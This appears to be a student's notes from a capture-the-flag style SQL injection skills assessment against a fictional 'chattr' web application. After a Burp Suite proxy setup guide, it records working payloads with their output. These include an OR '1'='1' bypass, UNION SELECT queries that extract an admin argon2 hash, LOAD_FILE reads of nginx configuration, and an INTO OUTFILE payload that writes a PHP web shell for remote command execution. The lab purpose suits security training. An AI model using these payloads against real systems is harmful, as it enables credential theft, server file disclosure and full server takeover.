
Skills Assessment - SQL Injection Fundamentals
Scenario
You have been contracted by chattr GmbH to conduct a penetration test of their web application. In light of a recent breach of one of their main competitors, they are particularly concerned with SQL injection vulnerabilities and the damage the discovery and successful exploitation of this attack could do to their public image and bottom line.

They provided a target IP address and no further information about their website. Perform an assessment specifically focused on testing for SQL injection vulnerabilities on the web application from a "black box" approach.

Chattr login page with fields for username and password, login button, and a person on the phone in an office.

Intercepting HTTPS Traffic with Burp Suite
The web application in this skills assessment uses HTTPS, which Burp Suite can not be intercept by default. To do so, it is necessary to either install Burp Suite's Certificate Authority (CA) in your browser, or to use the integrated browser in Burp Suite.

Option 1: Using Burp Suite's Integrated Browser (Chromium)
One way to intercept traffic to websites that use HTTPS is to use the browser integrated into Burp Suite. To do so, simply navigate to the Proxy tab and click Open browser. In addition to intercepting HTTPS traffic, the integrated browser has a couple of Burp Suite's browser extensions pre-installed, such as DOM Invader, which is a useful tool for identifying DOM-based XSS.

Burp Suite showing intercepted POST request to chatr login page with username 'jsmith' and password field filled.

Option 2: Installing PortSwigger's CA in your own Browser
The other way to intercept traffic to websites that use HTTPS, is to install BrupSuite's CA into your web browser of choice. PortSwigger has an article which documents the process for Chrome, Firefox, and Safari. For example, let's see how it works in Firefox.

After configuring your browser to use Burp Suite as a proxy (default: http://localhost:8080), go to http://burpsuite. You should see the following page:

Burp Suite Community Edition welcome page with CA Certificate button.

Click on CA Certificate and save cacert.der to a known location. This is Burp Suite's CA which will need to import into Firefox, so that the browser will trust the proxy.

Next, head over to Settings, and search for "Certificates". You will need to click on the View Certificates... button shown below:

Firefox settings search results for 'certi' with options to view certificates and security devices.

Inside the Certificate Manager dialog, open the Authorities tab, and click Import. Select the cacert.der file that we just downloaded, check both boxes, and click Ok to import the CA.

Firefox Certificate Manager under Authorities tab, importing a certificate with options to trust CA for websites and email users, OK button highlighted.

We can then utilize the Firefox extension FoxyProxy to easily and quickly change Firefox proxy settings. This extension is pre-installed in your PwnBox instance and can be installed on your own Firefox browser by visiting the Firefox Extensions Page and clicking Add to Firefox to install it.

Once we have the extension added, we can configure the web proxy on it by clicking on its icon in Firefox's top bar and then choosing Options:

FoxyProxy menu with options for "Options," "What's My IP?" and "Log."

Once we're on the Options page, we can click on Add on the left pane, and then use 127.0.0.1 as the IP, and 8080 as the port, name it Burp, and click Save:

Edit Proxy Burp/ZAP settings. Fields for title, color, proxy type, IP address, port, username, and password. Buttons for "Cancel," "Save & Add Another," "Save & Edit Patterns," and "Save."

Finally, we can click on the FoxyProxy plugin icon and select Burp:

FoxyProxy menu with Burp/ZAP enabled. Options for "Options," "What's My IP?" and "Log."

Once that's done, we should now be able to intercept HTTPS traffic in Burp Suite with no issues.

Burp Suite intercepting POST request to chatr login page with username 'jsmith' and password field filled.

Note: If you are using PwnBox for the assessment, you do not need to install the Burp certificate separately, as it is pre-installed by default. Just make sure to select the BURP option on the FoxyProxy Firefox plugin.


Q1. What is the password hash for the user 'admin'?


```
POST /api/register.php HTTP/1.1
Host: 154.57.164.82:31866
Cookie: PHPSESSID=e3jjh4tqcd4loen8lo9rq79fkc; cookie=4d325268597a6b7a596a686a5a4449314d4746684f474d7859544d325a6d5a6d597a63355954453359513d3d
Content-Length: 106
Cache-Control: max-age=0
Sec-Ch-Ua: "Not;A=Brand";v="8", "Chromium";v="150"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-GB,en;q=0.9
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
Origin: https://154.57.164.82:31866
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://154.57.164.82:31866/register.php
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Connection: keep-alive

username=test&password=hackers%40123&repeatPassword=hackers%40123&invitationCode=aaaa-bbbb-1111' OR '1'='1
```

```
admin') union select 1,2,3,4-- -

admin') union select 1,2, database(),4 from INFORMATION_SCHEMA.SCHEMATA-- -



admin') UNION SELECT 1,2,password,4 FROM Users WHERE username='admin'-- -

$argon2i$v=19$m=2048,t=4,p=3$dk4wdDBraE0zZVllcEUudA$CdU8zKxmToQybvtHfs1d5nHzjxw9DhkdcVToq6HTgvU  

```
Q2. What is the root path of the web application?

```
admin') UNION SELECT 1,2,LOAD_FILE('/etc/nginx/nginx.conf'),4-- -
```

```
user www-data; worker_processes auto; pid /run/nginx.pid; error_log /var/log/nginx/error.log; include /etc/nginx/modules-enabled/*.conf; events { worker_connections 768; # multi_accept on; } http { ## # Basic Settings ## sendfile on; tcp_nopush on; types_hash_max_size 2048; # server_tokens off; # server_names_hash_bucket_size 64; # server_name_in_redirect off; include /etc/nginx/mime.types; default_type application/octet-stream; ## # SSL Settings ## ssl_protocols TLSv1 TLSv1.1 TLSv1.2 TLSv1.3; # Dropping SSLv3, ref: POODLE ssl_prefer_server_ciphers on; ## # Logging Settings ## access_log /var/log/nginx/access.log; ## # Gzip Settings ## gzip on; # gzip_vary on; # gzip_proxied any; # gzip_comp_level 6; # gzip_buffers 16 8k; # gzip_http_version 1.1; # gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript; ## # Virtual Host Configs ## include /etc/nginx/conf.d/*.conf; include /etc/nginx/sites-enabled/*; } #mail { # # See sample authentication script at: # # http://wiki.nginx.org/ImapAuthenticateWithApachePhpScript # # # auth_http localhost/auth.php; # # pop3_capabilities "TOP" "USER"; # # imap_capabilities "IMAP4rev1" "UIDPLUS"; # # server { # listen localhost:110; # protocol pop3; # proxy on; # } # # server { # listen localhost:143; # protocol imap; # proxy on; # } #}
```


```


admin') UNION SELECT 1,2,LOAD_FILE('/etc/nginx/sites-enabled/default'),4-- -


server { listen 443 ssl; server_name chattr.htb; ssl_password_file /root/chattr.key.pass; ssl_certificate /etc/ssl/certs/chattr.crt; ssl_certificate_key /etc/ssl/private/chattr.key; ssl_protocols TLSv1.2 TLSv1.3; ssl_ciphers HIGH:!aNULL:!MD5; root /var/www/chattr-prod; location / { index index.php; try_files $uri $uri/ /index.php?$query_string; } location ~ \.php$ { include snippets/fastcgi-php.conf; fastcgi_pass unix:/run/php/php8.2-fpm.sock; } location ^~ /includes/ { deny all; } }
```


Q3. Achieve remote code execution, and submit the contents of /flag_XXXXXX.txt below.

```
admin') UNION SELECT 1,2,'<?php echo shell_exec($_GET["cmd"]); ?>',4 INTO OUTFILE '/var/www/chattr-prod/shell.php'-- -
```
![](Attachments/Pasted%20image%2020260918174426.png)